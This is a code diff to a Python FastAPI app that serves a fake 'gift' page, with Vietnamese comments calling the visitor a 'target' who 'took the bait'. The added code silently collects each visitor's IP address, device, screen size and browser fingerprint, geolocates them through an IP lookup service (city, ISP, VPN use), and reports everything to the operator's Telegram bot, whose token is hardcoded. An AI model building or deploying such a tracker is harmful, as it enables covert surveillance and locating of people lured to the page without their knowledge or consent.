@@ -30,17 +30,61 @@ try:
     TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8543900765:AAFRHplaqbv0fvaBXHNSeo4EWscyceIt4q0")
     TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "7841326585")
 
-    def trigger_webhook(user_agent: str):
-        """Feedback Loop: Bắn tín hiệu khi Target cắn câu"""
+    def trigger_webhook(user_agent: str, client_ip: str, visitor_id: str = "Unknown", extra_info: str = ""):
+        """Feedback Loop: chi tiết hơn với Visitor ID"""
+        
+        # GeoIP Lookup
+        location_text = "Unknown Location"
+        try:
+            # Using a slightly more detailed format
+            geo_req = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,message,country,city,isp,mobile,proxy", timeout=3)
+            if geo_req.status_code == 200:
+                geo_data = geo_req.json()
+                if geo_data.get("status") == "success":
+                    loc = f"{geo_data.get('city')}, {geo_data.get('country')}"
+                    isp = geo_data.get('isp')
+                    is_mobile = "📱 Mobile" if geo_data.get('mobile') else "🏠 WiFi/Fixed"
+                    is_proxy = "🛡️ VPN/Proxy detected!" if geo_data.get('proxy') else ""
+                    location_text = f"{loc}\nISP: {isp} ({is_mobile}) {is_proxy}"
+        except Exception:
+            pass
+
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        
+        # Format notification
+        text = (
+            f"🎯 *BÁO CÁO: Target đã xem quà!*\n\n"
+            f"🆔 *Visitor ID:* `{visitor_id}`\n"
+            f"🌐 *IP:* `{client_ip}`\n"
+            f"📍 *Vị trí:* {location_text}\n"
+            f"📱 *Thiết bị:* {user_agent}\n"
+        )
+        if extra_info:
+            text += f"📊 *Extra:* {extra_info}"
+        
         payload = {
             "chat_id": TELEGRAM_CHAT_ID, 
-            "text": f"🎯 BÁO CÁO: Target đã mở quà!\nThiết bị: {user_agent}"
+            "text": text,
+            "parse_mode": "Markdown"
         }
         try:
             requests.post(url, json=payload, timeout=5)
         except Exception as e:
             print(f"Webhook Error: {e}")
+
+    @app.post("/track")
+    async def track_visitor(request: Request, background_tasks: BackgroundTasks):
+        """Endpoint để nhận data fingerprinting từ frontend"""
+        data = await request.json()
+        visitor_id = data.get("visitorId", "Unknown")
+        screen_size = data.get("screen", "Unknown")
+        user_agent = request.headers.get('user-agent', 'Unknown')
+        
+        forwarded = request.headers.get("x-forwarded-for")
+        client_ip = forwarded.split(",")[0] if forwarded else (request.client.host if request.client else "Unknown")
+        
+        background_tasks.add_task(trigger_webhook, user_agent, client_ip, visitor_id, f"Screen: {screen_size}")
+        return {"status": "ok"}
 
     @app.get("/music.mp3")
     async def get_music():
@@ -53,7 +97,13 @@ try:
     @app.get("/", response_class=HTMLResponse)
     async def serve_reward(request: Request, background_tasks: BackgroundTasks):
         user_agent = request.headers.get('user-agent', 'Unknown')
-        background_tasks.add_task(trigger_webhook, user_agent)
+        
+        # Extract IP (Vercel uses x-forwarded-for)
+        forwarded = request.headers.get("x-forwarded-for")
+        client_ip = forwarded.split(",")[0] if forwarded else (request.client.host if request.client else "Unknown")
+
+        # Initial hit (no visitor ID yet)
+        background_tasks.add_task(trigger_webhook, user_agent, client_ip, "Pending Fingerprint")
 
         # Auto-discover all media in static/images/Library/
         img_dir = os.path.join(BASE_DIR, "static", "images", "Library")
